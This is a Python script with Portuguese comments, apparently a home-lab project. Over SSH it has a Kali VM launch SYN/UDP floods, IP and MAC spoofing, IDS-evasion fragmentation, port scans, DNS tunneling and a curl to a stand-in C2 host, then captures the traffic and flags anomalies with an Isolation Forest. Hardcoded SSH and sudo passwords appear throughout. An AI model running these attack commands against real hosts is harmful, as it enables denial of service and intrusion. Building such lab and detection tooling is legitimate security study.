# aqui funcionando com IA
# proximo passo é melhorar o mesmo dando a opção de escolher entre analise real e simulação


# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
# import pandas as pd
# from sklearn.ensemble import IsolationForest
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
# print("8️⃣ Retransmissões Excessivas")
# print("9️⃣ DNS Tunneling (Nomes longos/estranhos - com problema)")
# print("🔟 Domínios Suspeitos (Maliciosos)")
# print("1️⃣1️⃣ User-Agent Anormal (Falsificado)")
# print("1️⃣2️⃣ TLS Handshake Incompleto")
#
# opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
# elif opcao == "6":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
# elif opcao == "7":
#     comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
# elif opcao == "8":
#     comando = f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root"
# elif opcao == "9":
#     comando = f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
# elif opcao == "10":
#     comando = f"dig any comandos.controle.tk && curl http://c2.fake.ru"
# elif opcao == "11":
#     comando = f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}"
# elif opcao == "12":
#     comando = f"timeout 1 openssl s_client -connect {ip_vitima}:443"
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # 🔎 IA - Detecção com Isolation Forest
# features = []
# for pkt in pkts:
#     if IP in pkt:
#         proto = 6 if TCP in pkt else (17 if UDP in pkt else 0)
#         features.append({
#             "src_ip": pkt[IP].src,
#             "dst_ip": pkt[IP].dst,
#             "ip_len": pkt[IP].len,
#             "proto": proto,
#             "ttl": pkt[IP].ttl,
#             "src_port": pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0),
#             "dst_port": pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
#         })
#
# if features:
#     df = pd.DataFrame(features)
#     X = df.drop(columns=["src_ip", "dst_ip"])
#     model = IsolationForest(n_estimators=100, contamination=0.05, random_state=42)
#     model.fit(X)
#     df["anomaly"] = model.predict(X)
#
#     anomalias = df[df["anomaly"] == -1]
#     if not anomalias.empty:
#         print("\n⚠️ Anomalias detectadas com IA:")
#         print(anomalias[["src_ip", "dst_ip", "src_port", "dst_port", "ip_len", "ttl"]])
#     else:
#         print("✅ Nenhuma anomalia detectada com IA.")
# else:
#     print("⚠️ Nenhum pacote IP encontrado para análise de IA.")


# aqui funcionou
# agora no proximo codigo, vamos tentar dar o tipo de ataque na opção 1

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import pandas as pd
# from sklearn.ensemble import IsolationForest
#
# # Função auxiliar
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# def detecta_anomalias(pkts):
#     dados = []
#     for pkt in pkts:
#         if pkt.haslayer(IP):
#             src = pkt[IP].src
#             dst = pkt[IP].dst
#             length = pkt[IP].len
#             ttl = pkt[IP].ttl
#             sport = pkt[TCP].sport if pkt.haslayer(TCP) else pkt[UDP].sport if pkt.haslayer(UDP) else 0
#             dport = pkt[TCP].dport if pkt.haslayer(TCP) else pkt[UDP].dport if pkt.haslayer(UDP) else 0
#             dados.append([src, dst, sport, dport, length, ttl])
#
#     df = pd.DataFrame(dados, columns=["src_ip", "dst_ip", "src_port", "dst_port", "ip_len", "ttl"])
#     modelo = IsolationForest(contamination=0.05)
#     preds = modelo.fit_predict(df[["src_port", "dst_port", "ip_len", "ttl"]])
#     anomalias = df[preds == -1]
#     if not anomalias.empty:
#         print("\u26a0\ufe0f Anomalias detectadas com IA:")
#         print(anomalias)
#     else:
#         print("\u2705 Nenhuma anomalia detectada.")
#
# # Menu de modo
# print("\U0001f9e0 Modo de Operação:\n")
# print("1️⃣ Verificar a rede (modo monitoramento)")
# print("2️⃣ Simular ataque (modo ofensivo)")
# modo = input("\nEscolha o modo (1-2): ").strip()
#
# interface_id = "4"
# nome_arquivo = "captura_ataque.pcap"
#
# if modo == "1":
#     print(f"\n[+] Interface de captura: {interface_id} (VMnet8)")
#     print(f"\n[+] Iniciando captura passiva (30 segundos)...\n")
#     tshark_proc = subprocess.Popen([
#         r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
#         "-a", "duration:30", "-w", nome_arquivo, "-F", "pcap"
#     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#     tshark_proc.wait()
#     print(f"\n[+]2 Analisando tráfego capturado com IA...\n")
#     try:
#         pkts = rdpcap(nome_arquivo)
#         detecta_anomalias(pkts)
#     except Exception as e:
#         print(f"\u274c Erro ao abrir arquivo pcap: {e}")
#
# elif modo == "2":
#     # Aqui entraria todo o seu código atual de simulação de ataque
#     print("\n[!] Prossiga com a lógica da simulação de ataques aqui... (código original segue)")
#     # Copiar seu código principal daqui pra frente...
#     import subprocess
#     import time
#     import paramiko
#     import ipaddress
#     from scapy.all import rdpcap, IP, TCP, UDP, Raw
#     import os
#     import pandas as pd
#     from sklearn.ensemble import IsolationForest
#
#     def ip_privado(ip_str):
#         ip_obj = ipaddress.ip_address(ip_str)
#         redes_privadas = [
#             ipaddress.ip_network("10.0.0.0/8"),
#             ipaddress.ip_network("172.16.0.0/12"),
#             ipaddress.ip_network("192.168.0.0/16"),
#         ]
#         return any(ip_obj in rede for rede in redes_privadas)
#
#     print("🔐 Simulador de Ataques de Rede (Terminal)\n")
#     print("1️⃣ IP Spoofing")
#     print("2️⃣ TCP SYN Flood")
#     print("3️⃣ UDP Flood")
#     print("4️⃣ MAC Spoofing - com problema")
#     print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
#     print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
#     print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
#     print("8️⃣ Retransmissões Excessivas")
#     print("9️⃣ DNS Tunneling (Nomes longos/estranhos - com problema)")
#     print("🔟 Domínios Suspeitos (Maliciosos)")
#     print("1️⃣1️⃣ User-Agent Anormal (Falsificado)")
#     print("1️⃣2️⃣ TLS Handshake Incompleto")
#
#     opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
#     ip_kali = input("🖥️ IP da máquina Kali: ").strip()
#     ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
#     if opcao == "1":
#         ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
#     elif opcao == "4":
#         mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
#     interface_id = "4"
#     print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
#     nome_arquivo = "captura_ataque.pcap"
#     print("\n🎥 Iniciando captura com Tshark...\n")
#     tshark_proc = subprocess.Popen([
#         r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#         "-w", nome_arquivo, "-F", "pcap"
#     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
#     time.sleep(2)
#
#     print("🔐 Conectando na VM Kali...\n")
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#     if opcao == "1":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#     elif opcao == "2":
#         comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
#     elif opcao == "3":
#         comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
#     elif opcao == "4":
#         comando = (
#             f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#             f"sudo ip link set eth0 address {mac_fake} && "
#             f"sudo ip link set eth0 up && "
#             f"ping -c 5 {ip_vitima} && "
#             f"sudo ip link set eth0 down && "
#             f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#             f"sudo ip link set eth0 up"
#         )
#     elif opcao == "5":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
#     elif opcao == "6":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
#     elif opcao == "7":
#         comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
#     elif opcao == "8":
#         comando = f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root"
#     elif opcao == "9":
#         comando = f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
#     elif opcao == "10":
#         comando = f"dig any comandos.controle.tk && curl http://c2.fake.ru"
#     elif opcao == "11":
#         comando = f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}"
#     elif opcao == "12":
#         comando = f"timeout 1 openssl s_client -connect {ip_vitima}:443"
#     else:
#         print("❌ Opção inválida.")
#         exit()
#
#     print(f"🚀 Executando ataque:\n{comando}\n")
#     stdin, stdout, stderr = ssh.exec_command(comando)
#     print(stdout.read().decode())
#     print(stderr.read().decode())
#     ssh.close()
#
#     print("⌛ Aguardando término do ataque...")
#     time.sleep(12)
#
#     print("🛑 Encerrando captura...\n")
#     tshark_proc.terminate()
#     time.sleep(2)
#
#     print("📂 Analisando pacotes capturados...\n")
#     try:
#         pkts = rdpcap(nome_arquivo)
#     except Exception as e:
#         print(f"❌ Erro ao abrir arquivo pcap: {e}")
#         exit()
#
#     # 🔎 IA - Detecção com Isolation Forest
#     features = []
#     for pkt in pkts:
#         if IP in pkt:
#             proto = 6 if TCP in pkt else (17 if UDP in pkt else 0)
#             features.append({
#                 "src_ip": pkt[IP].src,
#                 "dst_ip": pkt[IP].dst,
#                 "ip_len": pkt[IP].len,
#                 "proto": proto,
#                 "ttl": pkt[IP].ttl,
#                 "src_port": pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0),
#                 "dst_port": pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
#             })
#
#     if features:
#         df = pd.DataFrame(features)
#         X = df.drop(columns=["src_ip", "dst_ip"])
#         model = IsolationForest(n_estimators=100, contamination=0.05, random_state=42)
#         model.fit(X)
#         df["anomaly"] = model.predict(X)
#
#         anomalias = df[df["anomaly"] == -1]
#         if not anomalias.empty:
#             print("\n⚠️ Anomalias detectadas com IA:")
#             print(anomalias[["src_ip", "dst_ip", "src_port", "dst_port", "ip_len", "ttl"]])
#         else:
#             print("✅ Nenhuma anomalia detectada com IA.")
#     else:
#         print("⚠️ Nenhum pacote IP encontrado para análise de IA.")
#
# else:
#     print("\u274c Modo inválido. Encerrando.")




# funcionando

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
# import pandas as pd
#
# # Função auxiliar
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Novo classificador aprimorado de tipo de ataque
# def classificar_tipo_ataque(pkt):
#     # IP Spoofing detecta pacotes de IP privado que não sejam da faixa local 192.168.x.x
#     if pkt['dst_port'] == 80 and ip_privado(pkt['src_ip']) and not pkt['src_ip'].startswith("192.168."):
#         return "IP Spoofing"
#     elif pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
#         return "DNS Tunneling"
#     elif pkt['dst_port'] == 80 and pkt['ttl'] <= 5:
#         return "TTL Alterado"
#     elif pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     return "Tipo desconhecido"
#
# print("\U0001F9E0 Modo de Operação:\n")
# print("1️⃣ Verificar a rede (modo monitoramento)")
# print("2️⃣ Simular ataque (modo ofensivo)")
# modo = input("\nEscolha o modo (1-2): ").strip()
#
#
#
# if modo == "1":
#     interface_id = "4"
#     print(f"\n[+] Interface de captura: {interface_id} (VMnet8)")
#
#     nome_arquivo = "captura_ataque.pcap"
#     print("\n[+] Iniciando captura passiva (60 segundos)...\n")
#     tshark_proc = subprocess.Popen([
#         r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
#         "-a", "duration:60", "-w", nome_arquivo, "-F", "pcap"
#     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
#     tshark_proc.wait()
#
#     print("\n[+]2 Analisando tráfego capturado com IA...\n")
#
#     try:
#         pkts = rdpcap(nome_arquivo)
#     except Exception as e:
#         print(f"❌ Erro ao abrir arquivo pcap: {e}")
#         exit()
#
#     linhas = []
#     for pkt in pkts:
#         if pkt.haslayer(IP):
#             # FILTRO para ignorar tráfego comum de rede (mDNS, DNS, NetBIOS)
#             dst_ip = pkt[IP].dst
#             dst_port = pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None)
#
#             if dst_ip.startswith("224.") or dst_port in [53, 137, 123, 5353]:
#                 continue  # Ignora pacotes conhecidos como DNS, mDNS, NetBIOS
#
#             linhas.append({
#                 'src_ip': pkt[IP].src,
#                 'dst_ip': pkt[IP].dst,
#                 'src_port': pkt[TCP].sport if pkt.haslayer(TCP) else (pkt[UDP].sport if pkt.haslayer(UDP) else None),
#                 'dst_port': pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None),
#                 'ip_len': pkt[IP].len,
#                 'ttl': pkt[IP].ttl
#             })
#
#     if linhas:
#         df = pd.DataFrame(linhas)
#         print("\n⚠️ Anomalias detectadas com IA:")
#         print(df)
#
#         print("\n🕵️‍♂️ Classificação do tipo de ataque detectado:")
#         for _, linha in df.iterrows():
#             tipo = classificar_tipo_ataque(linha)
#             print(f"{linha['src_ip']} → {linha['dst_ip']} - {tipo}")
#     else:
#         print("✅ Nenhum tráfego relevante capturado.")
#
#     print("\n✅ Monitoramento finalizado.")
#
# elif modo == "2":
#     # Aqui entraria todo o seu código atual de simulação de ataque
#     print("\n[!] Prossiga com a lógica da simulação de ataques aqui...")
#     # Copiar seu código principal daqui pra frente...
#     import subprocess
#     import time
#     import paramiko
#     import ipaddress
#     from scapy.all import rdpcap, IP, TCP, UDP, Raw
#     import os
#     import pandas as pd
#     from sklearn.ensemble import IsolationForest
#
#     def ip_privado(ip_str):
#         ip_obj = ipaddress.ip_address(ip_str)
#         redes_privadas = [
#             ipaddress.ip_network("10.0.0.0/8"),
#             ipaddress.ip_network("172.16.0.0/12"),
#             ipaddress.ip_network("192.168.0.0/16"),
#         ]
#         return any(ip_obj in rede for rede in redes_privadas)
#
#     print("🔐 Simulador de Ataques de Rede (Terminal)\n")
#     print("1️⃣ IP Spoofing")
#     print("2️⃣ TCP SYN Flood")
#     print("3️⃣ UDP Flood")
#     print("4️⃣ MAC Spoofing - com problema")
#     print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
#     print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
#     print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
#     print("8️⃣ Retransmissões Excessivas")
#     print("9️⃣ DNS Tunneling (Nomes longos/estranhos - com problema)")
#     print("🔟 Domínios Suspeitos (Maliciosos)")
#     print("1️⃣1️⃣ User-Agent Anormal (Falsificado)")
#     print("1️⃣2️⃣ TLS Handshake Incompleto")
#
#     opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
#     ip_kali = input("🖥️ IP da máquina Kali: ").strip()
#     ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
#     if opcao == "1":
#         ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
#     elif opcao == "4":
#         mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
#     interface_id = "4"
#     print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
#     nome_arquivo = "captura_ataque.pcap"
#     print("\n🎥 Iniciando captura com Tshark...\n")
#     tshark_proc = subprocess.Popen([
#         r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#         "-w", nome_arquivo, "-F", "pcap"
#     ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
#     time.sleep(2)
#
#     print("🔐 Conectando na VM Kali...\n")
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
#     ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
#     if opcao == "1":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
#     elif opcao == "2":
#         comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
#     elif opcao == "3":
#         comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
#     elif opcao == "4":
#         comando = (
#             f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#             f"sudo ip link set eth0 address {mac_fake} && "
#             f"sudo ip link set eth0 up && "
#             f"ping -c 5 {ip_vitima} && "
#             f"sudo ip link set eth0 down && "
#             f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#             f"sudo ip link set eth0 up"
#         )
#     elif opcao == "5":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}"
#     elif opcao == "6":
#         comando = f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
#     elif opcao == "7":
#         comando = f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
#     elif opcao == "8":
#         comando = f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root"
#     elif opcao == "9":
#         comando = f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done"
#     elif opcao == "10":
#         comando = f"dig any comandos.controle.tk && curl http://c2.fake.ru"
#     elif opcao == "11":
#         comando = f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}"
#     elif opcao == "12":
#         comando = f"timeout 1 openssl s_client -connect {ip_vitima}:443"
#     else:
#         print("❌ Opção inválida.")
#         exit()
#
#     print(f"🚀 Executando ataque:\n{comando}\n")
#     stdin, stdout, stderr = ssh.exec_command(comando)
#     print(stdout.read().decode())
#     print(stderr.read().decode())
#     ssh.close()
#
#     print("⌛ Aguardando término do ataque...")
#     time.sleep(12)
#
#     print("🛑 Encerrando captura...\n")
#     tshark_proc.terminate()
#     time.sleep(2)
#
#     print("📂 Analisando pacotes capturados...\n")
#     try:
#         pkts = rdpcap(nome_arquivo)
#     except Exception as e:
#         print(f"❌ Erro ao abrir arquivo pcap: {e}")
#         exit()
#
#     # 🔎 IA - Detecção com Isolation Forest
#     features = []
#     for pkt in pkts:
#         if IP in pkt:
#             proto = 6 if TCP in pkt else (17 if UDP in pkt else 0)
#             features.append({
#                 "src_ip": pkt[IP].src,
#                 "dst_ip": pkt[IP].dst,
#                 "ip_len": pkt[IP].len,
#                 "proto": proto,
#                 "ttl": pkt[IP].ttl,
#                 "src_port": pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0),
#                 "dst_port": pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)
#             })
#
#     if features:
#         df = pd.DataFrame(features)
#         X = df.drop(columns=["src_ip", "dst_ip"])
#         model = IsolationForest(n_estimators=100, contamination=0.05, random_state=42)
#         model.fit(X)
#         df["anomaly"] = model.predict(X)
#
#         anomalias = df[df["anomaly"] == -1]
#         if not anomalias.empty:
#             print("\n⚠️ Anomalias detectadas com IA:")
#             print(anomalias[["src_ip", "dst_ip", "src_port", "dst_port", "ip_len", "ttl"]])
#         else:
#             print("✅ Nenhuma anomalia detectada com IA.")
#     else:
#         print("⚠️ Nenhum pacote IP encontrado para análise de IA.")
#
# else:
#     print("\u274c Modo inválido. Encerrando.")
# #








import subprocess
import time
import paramiko
import ipaddress
import os
import pandas as pd
from scapy.all import rdpcap, IP, TCP, UDP
from sklearn.ensemble import IsolationForest

# Funções auxiliares
def ip_privado(ip_str):
    ip_obj = ipaddress.ip_address(ip_str)
    redes_privadas = [
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
    ]
    return any(ip_obj in rede for rede in redes_privadas)



# def classificar_tipo_ataque(pkt):
#     # 1️⃣ Primeira coisa: checar spoofing
#     if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
#         return "IP Spoofing Externo"
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if not pkt['src_ip'].startswith('192.168.'):
#             return "IP Spoofing Interno"
#
#     # 2️⃣ Checar TTL estranho
#     if pkt['ttl'] == 1:
#         if pkt['dst_ip'] == "255.255.255.255":
#             return "Broadcast interno (TTL 1 normal)"
#         else:
#             return "TTL Anômalo (possível evasão)"
#     elif pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     # 3️⃣ Outras anomalias conhecidas
#     if pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
#         return "DNS Tunneling"
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         return "Pacote Malformado"
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     # 4️⃣ Só depois: classificar tráfego normal
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling ou consulta normal)"
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     return "Tipo desconhecido"

# def classificar_tipo_ataque(pkt):
#     # Detectar IP Spoofing Externo
#     if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
#         return "IP Spoofing Externo"
#
#     # Detectar IP Spoofing Interno (mesmo 192.168.x.x)
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(
#                 ".131"):  # EXCLUI IP do roteador e da vítima real
#             return "IP Spoofing Interno"
#
#     # Detecção de TTL estranho
#     if pkt['ttl'] == 1:
#         if pkt['dst_ip'] == "255.255.255.255":
#             return "Broadcast interno (TTL 1 normal)"
#         else:
#             return "TTL Anômalo (possível evasão)"
#     elif pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     # Outras regras
#     if pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
#         return "DNS Tunneling"
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         return "Pacote Malformado"
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#
#     # Tráfego normal
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling ou consulta normal)"
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     return "Tipo desconhecido"



# aqui diferenciando o ataque de TTL alterado

# def classificar_tipo_ataque(pkt):
#     # Ignorar DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # Ignorar consultas DNS normais
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling ou consulta normal)"
#
#     # Ignorar tráfego NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # 🛡️ Primeiro verificar Evasão por TTL
#     if pkt['ttl'] == 1 or pkt['ttl'] <= 5:
#         return "Evasão por TTL Alterado"
#
#     # 🛡️ Depois classificar HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # Detectar IP Spoofing Externo
#     if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
#         return "IP Spoofing Externo"
#
#     # Detectar IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # Outros ataques
#     if pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
#         return "DNS Tunneling"
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
